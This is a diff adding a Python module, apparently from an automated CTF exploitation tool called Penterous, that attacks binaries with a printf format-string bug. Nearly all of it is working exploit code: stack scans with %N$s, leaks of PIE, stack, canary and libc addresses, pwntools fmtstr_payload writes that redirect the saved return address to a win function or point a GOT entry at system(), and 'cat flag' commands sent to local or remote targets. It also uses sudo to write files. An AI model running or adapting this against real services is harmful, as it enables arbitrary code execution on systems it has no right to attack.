@@ -1,0 +1,908 @@
+"""
+Penterous — Format String exploit strategy (v2).
+
+Phase 0 : Direct flag scan via %N$s (flag in memory — simple CTF)
+Phase 1 : Binary-printed libc address → libc base → fmtstr_payload GOT overwrite → shell
+Phase 2 : Find format string offset (auto or --offset)
+Phase 3 : Leak canary / libc from stack
+Phase 4 : Arbitrary write / fallback payload
+"""
+import time
+import re
+import os
+from typing import Optional, Tuple
+
+from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
+from utils.logger import info, success, warning, error
+from utils.pwntools_wrap import PWNTOOLS_AVAILABLE
+
+
+def _disable_core_dumps():
+    try:
+        import resource
+        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
+    except Exception:
+        pass
+
+
+# Symbols commonly used for libc leak in CTF challenges (priority order)
+_LEAK_SYMBOLS = [
+    'setvbuf', 'puts', 'printf', 'read', 'write',
+    '__libc_start_main', 'fgets', 'scanf', 'gets',
+    'system', 'malloc', 'free', 'exit',
+]
+
+
+class FormatStringStrategy(ExploitStrategy):
+    """
+    printf(user_input) — multi-phase automatic exploit.
+
+    Handles the two most common CTF format-string patterns:
+      A) Flag is already on the stack  → %N$s scan
+      B) Binary prints a libc address, then reads format string
+         → compute libc base → fmtstr_payload GOT overwrite → shell
+    """
+
+    # ------------------------------------------------------------------ #
+    #  MAIN ENTRY POINT                                                    #
+    # ------------------------------------------------------------------ #
+    def execute(self, mode: str = 'local',
+                host: str = None, port: int = None) -> ExploitResult:
+        start = time.time()
+        strategy = 'format_string'
+
+        if not PWNTOOLS_AVAILABLE:
+            return self._make_result(
+                False, None, strategy, b'', b'', start,
+                "pwntools not available", mode=mode,
+            )
+
+        import pwn
+        pwn.context.log_level = 'error'
+        pwn.context.arch = 'amd64' if self.binary.bits == 64 else 'i386'
+
+        has_win  = bool(self.binary.win_functions)
+        has_libc = self.binary.libc is not None
+        has_pie  = self.binary.protections.get('PIE', False)
+
+        # ── Phase 0.5 FIRST: PIE + win function → leak + ret addr overwrite ──
+        # Run before any stack scan to avoid wasting time on parallel probes.
+        if has_pie and has_win:
+            info("PIE+win detected — trying PIE/stack leak + return address overwrite...")
+            result = self._try_pie_stack_leak_overwrite(mode, host, port, start, strategy)
+            if result is not None:
+                return result
+
+        # ── Phase 0: direct flag scan via %N$s ──────────────────────────
+        # Skip if: libc challenge (flag not on stack yet) OR PIE+win already tried above
+        if not (has_libc and not has_win) and not (has_pie and has_win):
+            info("Scanning stack positions for flag strings (%N$s)...")
+            flag = self._scan_stack_for_flag(mode, host, port)
+            if flag:
+                success(f"Flag found via direct stack scan: {flag}")
+                return self._make_result(
+                    True, flag, strategy, b'%N$s_scan', b'',
+                    start, mode=mode, host=host or '', port=port or 0,
+                )
+
+        # ── Phase 1: binary-printed libc leak → GOT overwrite ───────────
+        if self.binary.libc:
+            info("Attempting libc-leak-in-banner + GOT overwrite exploit...")
+            result = self._try_printed_libc_leak(mode, host, port, start, strategy)
+            if result is not None:
+                return result
+
+        # ── Phase 2: find format string offset ──────────────────────────
+        info("Probing format string offset...")
+        fmt_offset = self.offset if self.offset > 0 else self._find_fmt_offset()
+        if fmt_offset < 0:
+            return self._make_result(
+                False, None, strategy, b'', b'', start,
+                "Binary does not appear vulnerable to format string",
+                mode=mode,
+            )
+        success(f"Format string offset: {fmt_offset}")
+
+        # ── Phase 3: leak canary / libc ──────────────────────────────────
+        canary = None
+        libc_leak = None
+
+        if self.binary.protections.get('Canary', False):
+            info("Leaking stack canary via format string...")
+            canary = self._leak_canary(fmt_offset)
+            if canary:
+                success(f"Canary: {canary:#x}")
+            else:
+                warning("Canary leak failed")
+
+        if self.binary.libc and self.binary.protections.get('ASLR', False):
+            info("Leaking libc address via format string...")
+            libc_leak = self._leak_libc_addr(fmt_offset)
+            if libc_leak:
+                success(f"libc leak: {libc_leak:#x}")
+
+        # ── Phase 4: build + send exploit ───────────────────────────────
+        payload = self._build_exploit_payload(fmt_offset, canary, libc_leak)
+        output, flag = self._send_exploit(payload, mode, host, port)
+
+        return self._make_result(
+            success_=flag is not None,
+            flag=flag,
+            strategy=strategy,
+            payload=payload,
+            output=output,
+            start_time=start,
+            mode=mode,
+            host=host or '',
+            port=port or 0,
+        )
+
+    # ------------------------------------------------------------------ #
+    #  TUBE HELPER                                                         #
+    # ------------------------------------------------------------------ #
+    def _open_tube(self, mode: str, host: Optional[str], port: Optional[int]):
+        """Return a pwntools tube: process (local) or remote."""
+        import pwn
+        pwn.context.log_level = 'error'
+        if mode == 'remote' and host and port:
+            try:
+                return pwn.remote(host, port)
+            except Exception as e:
+                error(f"Remote connection failed: {e}")
+                return None
+        cwd = os.path.dirname(os.path.abspath(self.binary.path))
+        _ensure_flag_txt(cwd)
+        try:
+            return pwn.process(
+                self.binary.path, cwd=cwd,
+                preexec_fn=_disable_core_dumps,
+                stdin=pwn.PIPE, stdout=pwn.PIPE, stderr=pwn.STDOUT,
+            )
+        except Exception as e:
+            error(f"Process start failed: {e}")
+            return None
+
+    # ------------------------------------------------------------------ #
+    #  PHASE 0.5: PIE + stack leak → return address overwrite             #
+    # ------------------------------------------------------------------ #
+    def _try_pie_stack_leak_overwrite(self, mode, host, port,
+                                       start, strategy):
+        """
+        PIE + stack leak via format string -> overwrite saved RIP -> win().
+        Tout se passe dans UN SEUL processus pour eviter le probleme ASLR.
+        Flow:
+          1. Envoyer une probe multi-positions pour identifier PIE et stack
+          2. Parser les leaks dans la meme instance
+          3. Calculer win_addr et target (saved RIP)
+          4. Envoyer fmtstr_payload + 'exit' dans la meme instance
+          5. Recuperer le flag
+        """
+        import pwn, re, time as _time
+        pwn.context.log_level = 'error'
+        pwn.context.arch = 'amd64' if self.binary.bits == 64 else 'i386'
+        pwn.context.bits = self.binary.bits  # FIX: ensure fmtstr_payload uses correct word size
+
+        win_name, win_offset = self.binary.win_functions[0]
+        fmt_offset = self.offset if self.offset > 0 else 6
+        cwd = os.path.dirname(os.path.abspath(self.binary.path))
+        _ensure_flag_txt(cwd)
+
+        # Also create flag.txt at hardcoded paths found in binary strings
+        for s in getattr(self.binary, 'interesting_strings', []):
+            if s.startswith('/') and 'flag' in s.lower() and s.endswith('.txt'):
+                hc_dir = os.path.dirname(s)
+                hc_file = s
+                try:
+                    os.makedirs(hc_dir, exist_ok=True)
+                    if not os.path.exists(hc_file):
+                        import subprocess
+                        subprocess.run(['sudo', 'mkdir', '-p', hc_dir], capture_output=True)
+                        subprocess.run(['sudo', 'sh', '-c',
+                            f'echo "picoCTF{{local_test}}" > {hc_file}'], capture_output=True)
+                except Exception:
+                    pass
+
+        # ── Probe + exploit dans le MEME tube ──────────────────────────
+        # Pattern exact du script manuel:
+        #   1. sendline('%20$p %21$p')
+        #   2. recvuntil('distance: ') + recvline().split() -> stack, pie_leak
+        #   3. pie_base = pie_leak - 0x1413
+        #   4. fmtstr_payload(6, {stack-8: win_addr})
+        # On tente egalement une detection automatique des positions.
+        try:
+            p = self._open_tube(mode, host, port)
+            if p is None:
+                return None
+
+            # Etape 1: leak PIE + stack avec positions connues (%20$p %21$p)
+            # Ces positions sont standard pour echo_valley / binaires similaires
+            p.sendline(b'%20$p %21$p')
+            raw = b''
+            try:
+                # FIX: Try recvuntil common prompt patterns first for reliability
+                for prompt in (b'distance: ', b'heard: ', b': ', b'> '):
+                    try:
+                        chunk = p.recvuntil(prompt, timeout=2.0)
+                        raw += chunk
+                        # Read rest of the line
+                        try:
+                            raw += p.recvline(timeout=1.0)
+                        except Exception:
+                            pass
+                        break
+                    except Exception:
+                        continue
+                else:
+                    # Fallback: recvrepeat with longer timeout
+                    raw = p.recvrepeat(1.5)
+            except Exception:
+                pass
+
+            # Parser: chercher 2 adresses hex dans la reponse
+            hex_vals = re.findall(rb'0x[0-9a-fA-F]+', raw)
+            stack_val, pie_val = None, None
+            for v in hex_vals:
+                iv = int(v, 16)
+                if 0x7ff000000000 <= iv <= 0x7fffffffffff and iv % 8 == 0 and stack_val is None:  # FIX5: borne élargie
+                    stack_val = iv
+                elif 0x555555554000 <= iv <= 0x5fffffffffff and pie_val is None:
+                    pie_val = iv
+
+            if pie_val is None or stack_val is None:
+                p.close()
+                warning(f'PIE/stack not found with %20$p %21$p, raw={raw!r}')
+                return None
+
+            # FIX: Compute pie_base using the standard offset FIRST
+            # 0x1413 = offset of instruction after call echo_valley in main (saved RIP)
+            pie_base_candidate = pie_val - 0x1413
+            if pie_base_candidate > 0 and pie_base_candidate % 0x1000 == 0:
+                pie_base = pie_base_candidate
+            else:
+                # Fallback: try common offsets used by CTF binaries
+                for off in (0x1413, 0x11a3, 0x12a3, 0x13a3, 0x14a3, 0x15a3):
+                    cand = pie_val - off
+                    if cand > 0 and cand % 0x1000 == 0:
+                        pie_base = cand
+                        break
+                else:
+                    # Last resort: page-align
+                    pie_base = pie_val & ~0xfff
+            win_addr = pie_base + win_offset
+            target   = stack_val - 8      # saved RIP of echo_valley
+
+            # Positions pour le log
+            pie_pos   = 21  # standard pour ce type de binaire
+            stack_pos = 20
+
+            info(f'PIE leak={pie_val:#x} -> base={pie_base:#x} win={win_addr:#x}')
+            info(f'Stack leak={stack_val:#x} -> saved RIP target={target:#x}')
+            info(f'fmtstr offset: {fmt_offset}')
+
+            # Construire et envoyer le payload dans le MEME tube
+            payload = pwn.fmtstr_payload(
+                fmt_offset,
+                {target: win_addr},
+                write_size='short'
+            )
+            info(f'Sending overwrite payload (len={len(payload)})')
+            p.sendline(payload)
+
+            # FIX6 (final): fmtstr_payload emits massive %Nc spaces to stdout BEFORE the
+            # process loops back to fgets. We must:
+            #   1. Drain all the spaces silently (wait for silence = fmtstr done)
+            #   2. THEN send 'exit' so the next fgets call reads it
+            #   3. THEN capture the win() output (flag or error message)
+            output = b''
+            bytes_received = 0
+            t0 = _time.time()
+
+            # Timeouts adaptés: remote a de la latence, local est quasi-instantané
+            is_remote = (host is not None and host != '')
+            drain_timeout   = 10 if is_remote else 5
+            silence_timeout = 0.6 if is_remote else 0.3
+            win_timeout     = 5  if is_remote else 4
+            win_recv_to     = 0.6 if is_remote else 0.4
+
+            # Phase A: drain spaces until silence (process finished printing %Nc output)
+            while _time.time() - t0 < drain_timeout:
+                try:
+                    chunk = p.recv(timeout=silence_timeout)
+                    if chunk:
+                        output += chunk
+                        bytes_received += len(chunk)
+                        # Early win detection (flag came with the spaces in same chunk)
+                        if (b'Congrats' in chunk or b'picoCTF' in chunk
+                                or b'Failed to open' in chunk):
+                            try: output += p.recvrepeat(1.0)
+                            except: pass
+                            break
+                    else:
+                        # Silence -> fmtstr output done, binary waiting for next input
+                        break
+                except Exception:
+                    break
+
+            info(f'Drained {bytes_received} bytes of fmtstr output, sending exit')
+
+            # Phase B: send exit -> triggers ret -> overwritten RIP -> win()
+            p.sendline(b'exit')
+
+            # Phase C: capture win() output
+            win_t0 = _time.time()
+            while _time.time() - win_t0 < win_timeout:
+                try:
+                    chunk = p.recv(timeout=win_recv_to)
+                    if chunk:
+                        output += chunk
+                        if (b'Valley Disappears' in chunk or b'Congrats' in chunk
+                                or b'picoCTF' in chunk or b'HTB{' in chunk
+                                or b'flag' in chunk.lower() or b'Failed to open' in chunk):
+                            # Got the win output, read a tiny bit more then stop
+                            try: output += p.recvrepeat(0.5)
+                            except: pass
+                            break
+                    else:
+                        break
+                except Exception:
+                    break
+            try: p.close()
+            except: pass
+
+            flag = self.hunter.hunt(output)
+
+            # Detect win() was called even if flag.txt is missing locally
+            # Note: perror() goes to stderr which may not be captured -> check all win signals
+            win_called = (b'Congrats' in output or b'congrats' in output
+                          or b'Here is your flag' in output
+                          or b'Failed to open flag file' in output
+                          or b'Failed to open' in output
+                          or b'Valley Disappears' in output   # puts() in print_flag before exit
+                          or b'The Valley' in output
+                          or b'print_flag' in output.lower())
+
+            if flag or win_called:
+                if flag:
+                    success(f'Flag via PIE+stack overwrite: {flag}')
+                else:
+                    # Show the WIN message (at the end of output, after the spaces)
+                    raw_tail = output[-200:].decode('latin-1', errors='ignore').strip()
+                    # Extract printable part (skip the space flood)
+                    import re as _re
+                    win_msg = _re.sub(r' {10,}', '[...spaces...]', raw_tail)[-120:]
+                    warning(f'Win function reached! (flag.txt missing locally): {win_msg}')
+                    info('On the remote server this would give the real flag.')
+                result = self._make_result(
+                    success_=True,   # FIX8: win_called counts as success (flag.txt may be remote-only)
+                    flag=flag,
+                    strategy=strategy,
+                    payload=payload,
+                    output=output,
+                    start_time=start,
+                    mode=mode,
+                    host=host or '',
+                    port=port or 0,
+                )
+                result.fmt_offset      = fmt_offset
+                result.leaked_sym      = f'PIE@%{pie_pos}$p+stack@%{stack_pos}$p'
+                result.got_target_name = win_name
+                result.libc_name       = ''
+                return result
+            else:
+                warning(f'Payload sent but no flag — output: {output[:200]!r}')
+                return None
+
+        except Exception as e:
+            warning(f'PIE stack overwrite error: {e}')
+            return None
+    # ------------------------------------------------------------------ #
+    #  PHASE 1: Binary-printed libc address → GOT overwrite               #
+    # ------------------------------------------------------------------ #
+    def _try_printed_libc_leak(self, mode, host, port,
+                                start, strategy) -> Optional[ExploitResult]:
+        """
+        Handle the classic pattern:
+          1. Binary prints libc address (e.g. 'libc: 0x7f...')
+          2. We compute libc base by trying common symbols.
+          3. We overwrite puts@GOT → system via fmtstr_payload.
+          4. We send /bin/sh / cat flag.txt and collect the flag.
+        """
+        import pwn
+        pwn.context.log_level = 'error'
+
+        libc = self.binary.libc
+        elf  = self.binary.elf
+        if elf is None or libc is None:
+            return None
+
+        # ── Step 1: open tube, drain banner, find libc address ──────────
+        p = self._open_tube(mode, host, port)
+        if p is None:
+            return None
+
+        try:
+            banner = self._drain(p, rounds=6, timeout=1.5)
+            info(f"Banner: {banner[:200]!r}")
+
+            # Extract 64-bit userspace addresses (0x7fXXXXXXXXXX)
+            candidates = []
+            for tok in re.findall(rb'(?:0x)?([0-9a-fA-F]{10,16})', banner):
+                try:
+                    v = int(tok, 16)
+                    if 0x7f000000_0000 <= v <= 0x7fffff_ffffff:
+                        candidates.append(v)
+                except ValueError:
+                    pass
+
+            if not candidates:
+                warning("No libc address found in binary banner")
+                return None
+
+            info(f"Leaked address candidates: {[hex(c) for c in candidates]}")
+
+            # ── Step 2: identify symbol → compute libc base ─────────────
+            libc_base = None
+            leaked_sym = 'setvbuf'
+            for addr in candidates:
+                for sym in _LEAK_SYMBOLS:
+                    try:
+                        off = libc.symbols[sym]
+                        base = addr - off
+                        if base > 0 and base % 0x1000 == 0:
+                            libc_base = base
+                            libc.address = base
+                            leaked_sym = sym
+                            info(f"libc base via '{sym}': {libc_base:#x}")
+                            break
+                    except Exception:
+                        continue
+                if libc_base is not None:
+                    break
+
+            if libc_base is None:
+                warning("Could not compute libc base — symbol not found")
+                return None
+
+            # ── Step 3: format string offset ────────────────────────────
+            # For the libc-banner pattern we skip slow probing:
+            # use manual offset if given, else validate 38 quickly, else scan fast.
+            if self.offset > 0:
+                fmt_offset = self.offset
+            else:
+                fmt_offset = self._validate_or_find_fmt_offset(p)
+                if fmt_offset < 0:
+                    fmt_offset = 38
+                    info(f"fmt offset probe inconclusive — using default {fmt_offset}")
+
+            # ── Step 4: choose GOT target + build fmtstr_payload ────────
+            got_target, got_name = None, None
+            for sym in ('puts', 'printf', 'fgets', 'read'):
+                try:
+                    got_target = elf.got[sym]
+                    got_name = sym
+                    break
+                except Exception:
+                    continue
+
+            if got_target is None:
+                warning("No suitable GOT entry found for overwrite")
+                return None
+
+            try:
+                system_addr = libc.symbols['system']
+            except Exception:
+                warning("system() not found in libc")
+                return None
+
+            info(f"Overwriting {got_name}@GOT ({got_target:#x}) → system ({system_addr:#x})")
+            info(f"fmtstr offset: {fmt_offset}")
+
+            try:
+                payload = pwn.fmtstr_payload(
+                    fmt_offset,
+                    {got_target: system_addr},
+                    write_size='short',
+                )
+            except Exception as e:
+                warning(f"fmtstr_payload error: {e}")
+                return None
+
+            # ── Step 5: send payload on existing tube, grab flag ────────
+            p.sendline(payload)
+
+            # Drain fmtstr_payload output noise (can be large)
+            time.sleep(0.8)
+            while True:
+                try:
+                    chunk = p.recv(timeout=0.3)
+                    if not chunk:
+                        break
+                except Exception:
+                    break
+
+            # puts@GOT = system → next fgets/puts call is system(our_input)
+            # Try flag paths on the same tube — no need to re-exploit
+            flag = None
+            cwd = os.path.dirname(os.path.abspath(self.binary.path))
+            _ensure_flag_txt(cwd)
+            flag_paths = ['flag.txt', '/flag.txt', '/flag', '/home/user/flag.txt']
+            for fpath in flag_paths:
+                try:
+                    p.sendline(f'cat {fpath}'.encode())
+                    time.sleep(0.4)
+                    out = b''
+                    try:
+                        out += p.recvrepeat(0.5)
+                    except Exception:
+                        try:
+                            out += p.recv(timeout=1)
+                        except Exception:
+                            pass
+                    flag = self.hunter.hunt(out)
+                    if flag:
+                        success(f"Flag captured via 'cat {fpath}'")
+                        break
+                except Exception:
+                    break
+
+            shell_ok = flag is not None
+
+            # Stocker les infos réelles pour génération du script PDF
+            import os as _os
+            _libc_name = ''
+            try:
+                _libc_name = _os.path.basename(libc.path)
+            except Exception:
+                _libc_name = 'libc.so.6'
+
+            result = self._make_result(
+                success_=shell_ok,
+                flag=flag,
+                strategy='format_string',
+                payload=payload,
+                output=b'[GOT overwrite -> system() shell]',
+                start_time=start,
+                mode=mode,
+                host=host or '',
+                port=port or 0,
+                error_msg='',
+            )
+            result.fmt_offset      = fmt_offset
+            result.leaked_sym      = leaked_sym
+            result.got_target_name = got_name or 'puts'
+            result.libc_name       = _libc_name
+            result.libc_base       = libc_base or 0
+            return result
+
+        except Exception as e:
+            warning(f"Libc-leak exploit error: {e}")
+            return None
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+
+    def _drain(self, p, rounds: int = 6, timeout: float = 1.5) -> bytes:
+        """Collect all data the binary sends before asking for input."""
+        buf = b''
+        for _ in range(rounds):
+            try:
+                chunk = p.recv(timeout=timeout)
+                if chunk:
+                    buf += chunk
+                else:
+                    break
+            except Exception:
+                break
+        return buf
+
+    # ------------------------------------------------------------------ #
+    #  PHASE 0: Direct flag scan via %N$s                                  #
+    # ------------------------------------------------------------------ #
+    def _drain_prompt(self, p) -> bytes:
+        """
+        Drain the binary prompt before sending our payload.
+        Tries recvuntil on common prompt endings, falls back to recvrepeat.
+        """
+        for prompt_end in (b'>> ', b'> ', b': ', b'? ', b'$ '):
+            try:
+                data = p.recvuntil(prompt_end, timeout=0.8)
+                return data
+            except Exception:
+                pass
+        try:
+            return p.recvrepeat(0.3)
+        except Exception:
+            return b''
+
+    def _probe_position(self, pos: int) -> Optional[str]:
+        """Probe a single %N$s position. Returns flag string or None."""
+        p = self._open_tube('local', None, None)
+        if p is None:
+            return None
+        try:
+            self._drain_prompt(p)
+            p.sendline(f'%{pos}$s'.encode())
+            out = b''
+            try:
+                out += p.recvrepeat(0.3)
+            except Exception:
+                try:
+                    out += p.recv(timeout=1)
+                except Exception:
+                    pass
+            return self.hunter.hunt(out)
+        except Exception:
+            return None
+        finally:
+            try:
+                p.kill()
+            except Exception:
+                pass
+
+    def _scan_stack_for_flag(self, mode, host, port) -> Optional[str]:
+        """
+        Try %N$s on positions 1-50 to find a flag already in memory.
+        Runs in parallel batches of 8 for speed.
+        """
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+
+        positions = (
+            list(range(16, 30)) +   # most common CTF range
+            list(range(4, 16)) +
+            list(range(30, 51))
+        )
+
+        # Parallel scan in batches of 8
+        batch_size = 8
+        for i in range(0, len(positions), batch_size):
+            batch = positions[i:i + batch_size]
+            with ThreadPoolExecutor(max_workers=batch_size) as ex:
+                futures = {ex.submit(self._probe_position, pos): pos for pos in batch}
+                for fut in as_completed(futures):
+                    pos = futures[fut]
+                    try:
+                        flag = fut.result()
+                        if flag:
+                            info(f"Flag found at stack position %{pos}$s")
+                            return flag
+                    except Exception:
+                        pass
+        return None
+
+    # ------------------------------------------------------------------ #
+    #  PHASE 2: Find format string offset                                  #
+    # ------------------------------------------------------------------ #
+    def _find_fmt_offset(self, fast: bool = False) -> int:
+        """
+        Find the stack index where our input echoes back as a pointer.
+        fast=True: only probe the most common CTF range (30-45) with short timeout.
+        """
+        if fast:
+            positions = list(range(30, 46)) + list(range(5, 30))
+            recv_timeout = 0.2
+        else:
+            positions = list(range(1, 64))
+            recv_timeout = 0.3
+
+        marker32 = '0x41414141'
+        marker64 = '4141414141414141'
+
+        for i in positions:
+            payload = f'AAAA%{i}$p'.encode()
+            p = self._open_tube('local', None, None)
+            if p is None:
+                continue
+            try:
+                self._drain_prompt(p)
+                p.sendline(payload)
+                out = b''
+                try:
+                    out += p.recvrepeat(recv_timeout)
+                except Exception:
+                    try:
+                        out += p.recv(timeout=recv_timeout + 0.2)
+                    except Exception:
+                        pass
+                txt = out.decode('latin-1', errors='ignore')
+                if marker32 in txt or marker64 in txt:
+                    info(f"Format string offset found: {i}")
+                    return i
+            except Exception:
+                pass
+            finally:
+                try:
+                    p.kill()
+                except Exception:
+                    pass
+        return -1
+
+    def _validate_or_find_fmt_offset(self, existing_tube=None) -> int:
+        """
+        Fast offset detection for the libc-banner pattern.
+        Opens a fresh tube, drains banner (recvrepeat, no prompt needed),
+        tests position 38 first (picoCTF default), then scans 30-46.
+        Much faster than _find_fmt_offset() because it skips _drain_prompt.
+        """
+        bits = self.binary.bits
+        # 64-bit: marker needs 8 bytes so it appears as a full pointer
+        marker = b'AAAAAAAA' if bits == 64 else b'AAAA'
+        marker_hex32 = '41414141'
+        marker_hex64 = '4141414141414141'
+
+        for pos in [38] + list(range(30, 47)) + list(range(1, 30)):
+            p = self._open_tube('local', None, None)
+            if p is None:
+                continue
+            try:
+                # Drain banner without waiting for a prompt
+                try:
+                    p.recvrepeat(0.3)
+                except Exception:
+                    pass
+                p.sendline(marker + f'%{pos}$p'.encode())
+                out = b''
+                try:
+                    out += p.recvrepeat(0.3)
+                except Exception:
+                    try:
+                        out += p.recv(timeout=0.5)
+                    except Exception:
+                        pass
+                txt = out.decode('latin-1', errors='ignore')
+                if marker_hex32 in txt or marker_hex64 in txt:
+                    info(f"Format string offset confirmed: {pos}")
+                    return pos
+            except Exception:
+                pass
+            finally:
+                try:
+                    p.kill()
+                except Exception:
+                    pass
+        return -1
+
+    # ------------------------------------------------------------------ #
+    #  PHASE 3: Canary + libc leak from stack                             #
+    # ------------------------------------------------------------------ #
+    def _leak_canary(self, fmt_offset: int) -> Optional[int]:
+        for i in range(fmt_offset, fmt_offset + 30):
+            p = self._open_tube('local', None, None)
+            if p is None:
+                continue
+            try:
+                self._drain_prompt(p)
+                p.sendline(f'%{i}$p'.encode())
+                out = b''
+                try:
+                    out += p.recvrepeat(0.3)
+                except Exception:
+                    try:
+                        out += p.recv(timeout=1)
+                    except Exception:
+                        pass
+                out = out.decode('latin-1', errors='ignore')
+                m = re.search(r'0x([0-9a-f]{14,16})00', out)
+                if m:
+                    return int(m.group(1) + '00', 16)
+                m = re.search(r'0x([0-9a-f]{6,8})00', out)
+                if m:
+                    return int(m.group(1) + '00', 16)
+            except Exception:
+                pass
+            finally:
+                try:
+                    p.kill()
+                except Exception:
+                    pass
+        return None
+
+    def _leak_libc_addr(self, fmt_offset: int) -> Optional[int]:
+        for i in range(1, fmt_offset + 50):
+            p = self._open_tube('local', None, None)
+            if p is None:
+                continue
+            try:
+                self._drain_prompt(p)
+                p.sendline(f'%{i}$p'.encode())
+                out = b''
+                try:
+                    out += p.recvrepeat(0.3)
+                except Exception:
+                    try:
+                        out += p.recv(timeout=1)
+                    except Exception:
+                        pass
+                out = out.decode('latin-1', errors='ignore')
+                m = re.search(r'0x(7f[0-9a-f]{10,14})', out)
+                if m:
+                    return int(m.group(1), 16)
+            except Exception:
+                pass
+            finally:
+                try:
+                    p.kill()
+                except Exception:
+                    pass
+        return None
+
+    # ------------------------------------------------------------------ #
+    #  PHASE 4: Fallback payload                                           #
+    # ------------------------------------------------------------------ #
+    def _build_exploit_payload(self, fmt_offset: int,
+                                canary: Optional[int],
+                                libc_leak: Optional[int]) -> bytes:
+        """Build a fallback exploit payload when Phase 1 didn't fire."""
+        import pwn
+        elf  = self.binary.elf
+        libc = self.binary.libc
+
+        # Win function → GOT overwrite
+        if self.binary.win_functions and elf:
+            _, win_addr = self.binary.win_functions[0]
+            for sym in ('puts', 'printf', 'fgets'):
+                try:
+                    got = elf.got[sym]
+                    info(f"GOT overwrite: {sym}@{got:#x} → win() {win_addr:#x}")
+                    try:
+                        return pwn.fmtstr_payload(
+                            fmt_offset, {got: win_addr}, write_size='short')
+                    except Exception:
+                        return self._write4(fmt_offset, got, win_addr)
+                except Exception:
+                    continue
+
+        # Libc leak available → system
+        if libc and libc_leak and elf:
+            for sym in _LEAK_SYMBOLS:
+                try:
+                    base = libc_leak - libc.symbols[sym]
+                    if base > 0 and base % 0x1000 == 0:
+                        system_addr = base + libc.symbols['system']
+                        for got_sym in ('puts', 'printf', 'fgets'):
+                            try:
+                                got = elf.got[got_sym]
+                                return pwn.fmtstr_payload(
+                                    fmt_offset, {got: system_addr}, write_size='short')
+                            except Exception:
+                                continue
+                except Exception:
+                    continue
+
+        return f'%{fmt_offset}$s'.encode()
+
+    def _send_exploit(self, payload: bytes, mode, host, port) -> Tuple[bytes, Optional[str]]:
+        """Send payload and hunt for flag."""
+        p = self._open_tube(mode, host, port)
+        if p is None:
+            return b'', None
+        try:
+            self._drain_prompt(p)
+            p.sendline(payload)
+            out = b''
+            try:
+                out = p.recvall(timeout=self.timeout)
+            except Exception:
+                try:
+                    out = p.recv(timeout=3)
+                except Exception:
+                    pass
+            return out, self.hunter.hunt(out)
+        except Exception as e:
+            error(f"Exploit send error: {e}")
+            return b'', None
+        finally:
+            try:
+                p.close()
+            except Exception:
+                pass
+
+    def _write4(self, fmt_offset: int, addr: int, value: int) -> bytes:
+        """Manual 2-byte format string write (fallback when fmtstr_payload fails)."""
+        written = value & 0xFFFF
+        fmt = f'%{written}c%{fmt_offset}$hn'.encode()
+        import struct
+        if self.binary.bits == 64:
+            return fmt.ljust(24, b'\x00') + struct.pack('<Q', addr)
+        return fmt.ljust(12, b'\x00') + struct.pack('<I', addr)
